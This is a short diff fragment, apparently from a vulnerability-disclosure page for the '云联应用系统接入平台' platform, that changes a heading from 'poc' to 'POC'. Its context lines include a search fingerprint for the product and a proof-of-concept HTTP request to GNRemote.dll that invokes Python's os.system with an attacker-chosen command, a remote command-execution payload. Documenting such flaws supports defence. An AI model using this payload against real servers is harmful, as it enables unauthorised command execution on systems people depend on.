@@ -8,7 +8,7 @@
 title="云联应用系统接入平台"
 ```
 
-## poc
+## POC
 
 ```yaml
 GET /GNRemote.dll?GNFunction=CallPython&pyFile=os&pyFunc=system&pyArgu=执行的命令 HTTP/1.1
